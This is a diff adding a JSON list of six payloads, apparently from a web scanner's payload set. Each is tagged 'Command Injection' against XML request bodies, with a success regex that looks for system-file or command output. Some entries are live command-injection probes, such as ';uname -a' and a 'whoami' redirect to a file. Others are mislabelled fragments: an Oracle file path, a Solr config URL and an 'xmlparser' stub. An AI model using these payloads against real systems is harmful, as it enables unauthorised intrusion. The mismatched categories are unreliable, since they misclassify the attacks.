@@ -1,0 +1,68 @@
+[
+  {
+    "payload_id": "OWP-56752",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": ".NET",
+    "injection_point": "body_xml",
+    "payload_string": "\"echo \"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-57749",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-63780",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "'whoami > C:\\\\x.txt'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-64993",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": ";uname -a",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-65307",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "{!xmlparser",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-65308",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "/solr/newcollection/config?stream.body",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  }
+]
